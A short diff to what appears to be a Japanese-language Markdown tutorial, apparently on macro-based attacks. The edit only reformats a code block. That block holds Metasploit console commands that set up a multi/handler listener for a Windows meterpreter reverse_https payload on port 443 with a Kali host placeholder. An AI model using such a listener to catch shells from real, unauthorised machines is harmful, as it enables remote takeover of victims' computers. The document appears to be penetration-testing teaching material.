@@ -766,7 +766,8 @@ End Sub
 >msfconsole
 >```
 >設定：
->```use exploit/multi/handler
+>```command
+>use exploit/multi/handler
 >set payload windows/x64/meterpreter/reverse_https
 >set LHOST <Kali_IP>
 >set LPORT 443
